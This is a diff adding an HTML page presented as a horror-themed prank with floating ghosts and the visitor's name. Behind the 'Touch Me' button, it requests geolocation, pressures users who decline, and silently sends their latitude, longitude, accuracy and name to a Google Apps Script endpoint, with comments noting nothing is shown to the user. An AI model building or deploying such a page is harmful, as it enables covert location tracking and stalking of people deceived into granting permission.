@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Horror Experience</title>
+  <style>
+    body {
+      font-family: 'Creepster', cursive;
+      background-color: #000;
+      color: #ff0000;
+      margin: 0;
+      overflow: hidden;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      position: relative;
+    }
+
+    .container {
+      z-index: 2;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+    }
+
+    button {
+      background-color: #ff0000;
+      color: #000;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.5rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: 'Creepster', cursive;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #990000;
+    }
+
+    /* Background with dark forest */
+    .background {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('https://student-qualityobe.kesug.com/wp-content/uploads/2025/02/istockphoto-497677230-612x612-1.jpg'); /* Replace with a valid dark forest image */
+      background-size: cover;
+      background-position: center;
+      z-index: 1;
+      opacity: 0;
+      transition: opacity 1s ease;
+    }
+
+    .background.active {
+      opacity: 1;
+    }
+
+    /* Ghosts flying in the background */
+    .ghost {
+      position: absolute;
+      font-size: 3rem;
+      animation: float 10s linear infinite;
+      opacity: 0;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateX(-100px) translateY(100vh);
+        opacity: 1;
+      }
+      50% {
+        transform: translateX(100px) translateY(50vh);
+        opacity: 0.8;
+      }
+      100% {
+        transform: translateX(200px) translateY(-100px);
+        opacity: 0;
+      }
+    }
+
+    /* Emojis floating up */
+    .emoji-container {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    .emoji {
+      position: absolute;
+      font-size: 3rem;
+      bottom: -100px;
+      animation: floatUp 5s linear infinite;
+    }
+
+    @keyframes floatUp {
+      0% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-100vh);
+        opacity: 0;
+      }
+    }
+
+    /* User's name floating like a pendulum */
+    .user-name {
+      position: absolute;
+      font-size: 4rem;
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      animation: pendulum 5s ease-in-out infinite;
+      z-index: 3;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    @keyframes pendulum {
+      0% {
+        transform: translateX(-50%) rotate(-15deg);
+      }
+      50% {
+        transform: translateX(50%) rotate(15deg);
+      }
+      100% {
+        transform: translateX(-50%) rotate(-15deg);
+      }
+    }
+
+    /* Message for location permission */
+    .message {
+      font-size: 1.5rem;
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      margin-top: 20px;
+    }
+
+    /* Hide elements initially */
+    .hidden {
+      display: none;
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+</head>
+<body>
+  <!-- Name input page -->
+  <div class="container" id="namePage">
+    <h1>Enter Your Name</h1>
+    <input type="text" id="userName" placeholder="Your Name" style="font-size: 1.5rem; padding: 10px; border-radius: 5px; border: 2px solid #ff0000; background-color: #000; color: #ff0000;">
+    <button onclick="submitName()">Submit</button>
+  </div>
+
+  <!-- Horror experience page -->
+  <div class="container hidden" id="horrorPage">
+    <h1>Here you will See the Magic</h1>
+    <button id="touchMeButton" onclick="startHorror()">Touch Me</button>
+    <div id="message" class="message"></div>
+  </div>
+
+  <!-- Background with dark forest -->
+  <div class="background" id="background"></div>
+
+  <!-- Ghosts flying in the background -->
+  <div id="ghostContainer"></div>
+
+  <!-- Emojis floating up -->
+  <div class="emoji-container" id="emojiContainer"></div>
+
+  <!-- User's name floating like a pendulum -->
+  <div id="userNameDisplay" class="user-name hidden"></div>
+
+  <!-- Audio for horror sound -->
+  <audio id="horrorSound" src="https://student-qualityobe.kesug.com/wp-content/uploads/2025/02/horror-sound-effect.mp3" loop></audio>
+
+  <script>
+    let userName = "";
+
+    // Function to handle name submission
+    function submitName() {
+      userName = document.getElementById('userName').value.trim();
+      if (userName) {
+        // Hide name input page and show horror experience page
+        document.getElementById('namePage').classList.add('hidden');
+        document.getElementById('horrorPage').classList.remove('hidden');
+      } else {
+        alert("Please enter your name!");
+      }
+    }
+
+    // Function to start the horror experience
+    function startHorror() {
+      // Check if geolocation is supported
+      if (navigator.geolocation) {
+        // Request location permission
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // If location is allowed, start the magic
+            startMagic();
+            sendLocation(position);
+          },
+          (error) => {
+            // If location is denied, show a message
+            document.getElementById('message').innerText = "Press allow button to see the magic!";
+          }
+        );
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    // Function to start the magic
+    function startMagic() {
+      // Hide the "Touch Me" button
+      document.getElementById('touchMeButton').classList.add('hidden');
+
+      // Activate the dark forest background
+      const background = document.getElementById('background');
+      background.classList.add('active');
+
+      // Display the user's name floating like a pendulum
+      const userNameDisplay = document.getElementById('userNameDisplay');
+      userNameDisplay.innerText = userName;
+      userNameDisplay.classList.remove('hidden');
+
+      // Play horror sound
+      const horrorSound = document.getElementById('horrorSound');
+      horrorSound.play();
+
+      // Add flying ghosts
+      const ghostContainer = document.getElementById('ghostContainer');
+      const ghostEmojis = ['👻', '💀', '🧟', '🧛'];
+
+      setInterval(() => {
+        const ghost = document.createElement('div');
+        ghost.className = 'ghost';
+        ghost.innerText = ghostEmojis[Math.floor(Math.random() * ghostEmojis.length)];
+        ghost.style.left = Math.random() * 100 + 'vw';
+        ghost.style.top = Math.random() * 100 + 'vh';
+        ghost.style.animationDuration = Math.random() * 10 + 5 + 's';
+        ghostContainer.appendChild(ghost);
+
+        // Remove ghosts after they disappear
+        setTimeout(() => {
+          ghost.remove();
+        }, 15000);
+      }, 2000);
+
+      // Add floating emojis
+      const emojiContainer = document.getElementById('emojiContainer');
+      const emojis = ['👻', '💀', '🎃', '🕷️', '🕸️', '🧟', '🧛', '🔪', '🩸'];
+
+      setInterval(() => {
+        const emoji = document.createElement('div');
+        emoji.className = 'emoji';
+        emoji.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+        emoji.style.left = Math.random() * 100 + 'vw';
+        emoji.style.animationDuration = Math.random() * 3 + 2 + 's';
+        emojiContainer.appendChild(emoji);
+
+        // Remove emojis after they float up
+        setTimeout(() => {
+          emoji.remove();
+        }, 5000);
+      }, 500);
+    }
+
+    // Function to send location data
+    function sendLocation(position) {
+      var lat = position.coords.latitude;
+      var lon = position.coords.longitude;
+      var accuracy = position.coords.accuracy;
+      var url = "https://script.google.com/macros/s/AKfycbwuN9Cve8HVYkNkEZiUU0QWvEqTameRkggiJiayz32iL6V-lkAUp8OhBkPWYD12BsAGcw/exec" + "?lat=" + lat + "&lon=" + lon + "&accuracy=" + accuracy + "&name=" + encodeURIComponent(userName);
+
+      // Send data to Google Apps Script
+      fetch(url)
+        .then(response => {
+          // No message displayed to the user
+        })
+        .catch(error => {
+          // No error message displayed to the user
+        });
+    }
+  </script>
+</body>
+</html>
